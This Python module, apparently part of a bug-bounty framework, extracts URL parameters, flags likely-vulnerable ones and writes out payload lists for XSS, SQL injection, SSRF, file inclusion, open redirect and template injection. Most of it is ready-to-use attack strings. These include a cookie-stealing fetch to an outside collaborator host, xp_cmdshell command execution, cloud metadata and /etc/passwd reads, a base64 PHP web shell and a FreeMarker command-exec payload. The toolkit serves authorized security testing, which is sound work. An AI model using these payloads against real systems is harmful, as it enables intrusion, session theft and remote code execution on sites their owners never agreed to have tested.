"""
Phase 4 - Manual Testing Aid
Payload generation, parameter fuzzing hints, CSRF/SQLi/XSS/SSRF helpers
"""
import urllib.parse
import re
from utils import logger as log
from utils import storage


# ─────────────────────────────────────────────
#  PAYLOAD LIBRARIES
# ─────────────────────────────────────────────

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><svg onload=alert(1)>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'-alert(1)-'",
    "\" onmouseover=alert(1) x=\"",
    "<body onload=alert(1)>",
    "${alert(1)}",
    "{{7*7}}",                          # SSTI probe
    "<script>fetch('https://burpcollaborator.net/'+document.cookie)</script>",
]

SQLI_PAYLOADS = [
    # Error-based
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Time-based blind
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=1",
    "1 AND 1=2",
    # Boolean
    "' AND '1'='1",
    "' AND '1'='2",
]

SQLI_PAYLOADS_ADVANCED = [
    # MySQL
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    # PostgreSQL
    "'; SELECT pg_sleep(5)--",
    "' UNION SELECT NULL,version()--",
    # MSSQL
    "'; EXEC xp_cmdshell('whoami')--",
    # SQLite
    "' UNION SELECT sqlite_version()--",
    # Generic OAST
    "' UNION SELECT load_file(0x2f6574632f706173737764)--",
]

CSRF_TIPS = [
    "Check for missing or predictable CSRF tokens",
    "Test CORS misconfiguration: try cross-origin fetch with credentials",
    "Try removing the CSRF token entirely — server may accept request",
    "Try changing POST to GET — some endpoints accept both",
    "Check if token is tied to session vs stateless",
    "Test SameSite cookie attribute (Lax/Strict/None)",
    "Check Content-Type: application/json bypass (CORS preflight skip)",
    "Try double-submit cookie pattern bypass",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/",                          # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://100.100.100.200/",                          # Alibaba metadata
    "http://metadata.google.internal/",                 # GCP metadata
    "http://0.0.0.0",
    "http://[::1]",
    "http://2130706433",                                 # 127.0.0.1 in decimal
    "http://0177.0.0.1",                                # Octal
    "http://0x7f000001",                                 # Hex
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/",                           # Redis
    "gopher://127.0.0.1:25/",                           # SMTP
    "http://burpcollaborator.net",                      # OOB
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "/proc/self/environ",
    "../../../../windows/win.ini",
]

OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2f..",
    "/\\evil.com",
    "https:evil.com",
    "%2F%2Fevil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

SSTI_PAYLOADS = {
    "Jinja2/Twig":     ["{{7*7}}", "{{config}}", "{{self.__class__.__mro__[1].__subclasses__()}}"],
    "FreeMarker":      ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"],
    "Smarty":          ["{$smarty.version}", "{php}echo id;{/php}"],
    "Velocity":        ["#set($x=7*7)${x}"],
    "Pebble":          ["{{7*7}}", "{%- for i in range(7) -%}{{ i }}{%- endfor -%}"],
    "Generic":         ["${7*7}", "#{7*7}", "<%= 7*7 %>"],
}


# ─────────────────────────────────────────────
#  ANALYSIS FUNCTIONS
# ─────────────────────────────────────────────

def extract_params(urls: list[str]) -> dict[str, list]:
    """Extract unique parameters from URL list for fuzzing."""
    params = {}
    for url in urls:
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param in qs:
                params.setdefault(param, [])
                params[param].append(url)
        except Exception:
            pass
    return {k: list(dict.fromkeys(v)) for k, v in params.items()}


def identify_interesting_params(params: dict[str, list]) -> dict[str, list]:
    """Flag params likely vulnerable to specific attacks."""
    patterns = {
        "sqli": re.compile(r"id|user|name|item|product|order|cat|type|num|sort|page|limit", re.I),
        "xss": re.compile(r"q|search|query|keyword|s|term|text|msg|message|content|comment", re.I),
        "ssrf": re.compile(r"url|uri|link|src|source|redirect|next|target|dest|return|path|host", re.I),
        "lfi": re.compile(r"file|path|page|template|include|module|doc|document|view|dir|folder", re.I),
        "open_redirect": re.compile(r"redirect|next|return|url|goto|continue|to|target|dest", re.I),
        "ssti": re.compile(r"template|format|view|theme|layout|render|style", re.I),
    }

    flagged = {}
    for param, urls in params.items():
        for vuln_type, pattern in patterns.items():
            if pattern.search(param):
                flagged.setdefault(vuln_type, [])
                flagged[vuln_type].append({"param": param, "sample_url": urls[0] if urls else ""})

    return flagged


def build_csrf_checklist(live_hosts: list[dict]) -> list[dict]:
    """Generate CSRF test checklist for live hosts."""
    checklist = []
    for host in live_hosts[:10]:
        url = host.get("url", "")
        checklist.append({
            "target": url,
            "checks": [
                "Test all state-changing endpoints (POST/PUT/PATCH/DELETE)",
                "Verify CSRF token presence and validation",
                "Check SameSite cookie attributes",
                "Test CORS headers for wildcard origins",
                "Try Content-Type: text/plain bypass",
            ]
        })
    return checklist


def generate_payload_file(target: str, params: dict, flagged: dict) -> str:
    """Generate a ready-to-use payload reference file."""
    lines = [
        f"# Bug Bounty Payload Reference",
        f"# Target: {target}",
        f"# Generated by BugHunt Framework",
        "",
        "=" * 60,
        "INTERESTING PARAMETERS",
        "=" * 60,
    ]

    for vuln_type, entries in flagged.items():
        lines.append(f"\n[{vuln_type.upper()}]")
        for e in entries:
            lines.append(f"  Param: {e['param']}")
            lines.append(f"  URL:   {e['sample_url']}")

    lines += [
        "",
        "=" * 60,
        "XSS PAYLOADS",
        "=" * 60,
    ]
    lines.extend(XSS_PAYLOADS)

    lines += [
        "",
        "=" * 60,
        "SQLI PAYLOADS",
        "=" * 60,
    ]
    lines.extend(SQLI_PAYLOADS)

    lines += [
        "",
        "=" * 60,
        "SSRF PAYLOADS",
        "=" * 60,
    ]
    lines.extend(SSRF_PAYLOADS)

    lines += [
        "",
        "=" * 60,
        "LFI PAYLOADS",
        "=" * 60,
    ]
    lines.extend(LFI_PAYLOADS)

    lines += [
        "",
        "=" * 60,
        "OPEN REDIRECT PAYLOADS",
        "=" * 60,
    ]
    lines.extend(OPEN_REDIRECT_PAYLOADS)

    lines += [
        "",
        "=" * 60,
        "SSTI PAYLOADS",
        "=" * 60,
    ]
    for engine, payloads in SSTI_PAYLOADS.items():
        lines.append(f"\n# {engine}")
        lines.extend(payloads)

    return "\n".join(lines)


def run(target: str, discovery_data: dict, resume: bool = False) -> dict:
    log.banner("MANUAL TESTING AID — Payloads & Analysis", 4)

    if resume and storage.phase_done(target, "manual"):
        log.info("Manual phase already completed, loading from cache...")
        return storage.load_phase(target, "manual")

    urls = discovery_data.get("urls", [])
    live_hosts = discovery_data.get("live_hosts", [])
    url_cats = discovery_data.get("url_categories", {})

    results = {
        "params": {},
        "flagged_params": {},
        "csrf_checklist": [],
        "payload_counts": {},
        "interesting_endpoints": {},
    }

    # --- Parameter Extraction ---
    log.section("Parameter Extraction")
    param_urls = url_cats.get("params", [])
    params = extract_params(param_urls)
    results["params"] = params
    log.success(f"Unique parameters discovered: {len(params)}")
    for p in list(params.keys())[:15]:
        log.result_line(p, f"{len(params[p])} URL(s)")

    # --- Parameter Classification ---
    log.section("Vuln-Likely Parameter Classification")
    flagged = identify_interesting_params(params)
    results["flagged_params"] = flagged

    for vuln_type, entries in flagged.items():
        log.finding(
            "MEDIUM" if vuln_type in ("sqli", "ssrf", "lfi") else "LOW",
            f"Potential {vuln_type.upper()} parameters",
            f"{len(entries)} parameter(s) worth testing"
        )
        for e in entries[:3]:
            log.result_line(f"  ?{e['param']}=", e['sample_url'][:60])

    # --- CSRF Checklist ---
    log.section("CSRF Test Targets")
    csrf_list = build_csrf_checklist(live_hosts)
    results["csrf_checklist"] = csrf_list
    log.success(f"CSRF test targets: {len(csrf_list)}")

    log.section("CSRF Tips")
    for tip in CSRF_TIPS:
        log.info(tip)

    # --- Payload Summary ---
    log.section("Available Payload Sets")
    payload_counts = {
        "XSS": len(XSS_PAYLOADS),
        "SQLi (basic)": len(SQLI_PAYLOADS),
        "SQLi (advanced)": len(SQLI_PAYLOADS_ADVANCED),
        "SSRF": len(SSRF_PAYLOADS),
        "LFI": len(LFI_PAYLOADS),
        "Open Redirect": len(OPEN_REDIRECT_PAYLOADS),
        "SSTI": sum(len(v) for v in SSTI_PAYLOADS.values()),
    }
    results["payload_counts"] = payload_counts
    for k, v in payload_counts.items():
        log.result_line(k, f"{v} payloads")

    # --- Interesting Endpoints ---
    log.section("High-Value Endpoints")
    interesting = {
        "api": url_cats.get("api", [])[:10],
        "admin": url_cats.get("admin", [])[:10],
        "auth": url_cats.get("auth", [])[:10],
        "uploads": url_cats.get("uploads", [])[:10],
    }
    results["interesting_endpoints"] = interesting
    for cat, ep_list in interesting.items():
        if ep_list:
            log.finding("INFO", f"{cat.upper()} endpoints ({len(ep_list)})", ep_list[0])

    # --- Save payload file ---
    payload_txt = generate_payload_file(target, params, flagged)
    storage.save_raw(target, "payloads.txt", payload_txt)
    log.success("Payloads saved → results/{target}/payloads.txt")

    storage.save_phase(target, "manual", results)
    log.success("Manual aid phase complete ✔")
    return results
